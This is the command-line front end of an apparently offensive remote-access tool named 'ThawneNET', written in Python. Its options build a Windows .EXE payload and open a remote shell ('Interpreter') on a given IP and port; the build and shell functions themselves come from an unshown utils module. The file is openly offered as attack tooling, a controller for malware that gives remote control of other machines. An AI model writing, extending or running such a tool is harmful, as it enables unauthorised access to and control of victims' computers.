#!/usr/bin/python
# -*- coding: utf-8 -*-
#  _______ _                               _   _ ______ _______
# |__   __| |                             | \ | |  ____|__   __|
#    | |  | |__   __ ___      ___ __   ___|  \| | |__     | |
#    | |  | '_ \ / _` \ \ /\ / / '_ \ / _ \ . ` |  __|    | |
#    | |  | | | | (_| |\ V  V /| | | |  __/ |\  | |____   | |
#    |_|  |_| |_|\__,_| \_/\_/ |_| |_|\___|_| \_|______|  |_|
#                                        - By Cisamu

from utils import *
import argparse
    
clearDirec()

parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT>]")
parser.add_argument('--build',help='For Building the .EXE',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
args = parser.parse_args()


if args.build:
    build()


elif args.shell:
    if args.ip and args.port:
        get_shell(args.ip,args.port) 
    else:
        print(stdOutput("error")+"\033[1mArguments Missing, example: server.py --shell -i 127.0.0.1 -p 8080")
else:
    print(stdOutput("error")+"\033[1mArguments Missing --build to create build --shell to access remote shell")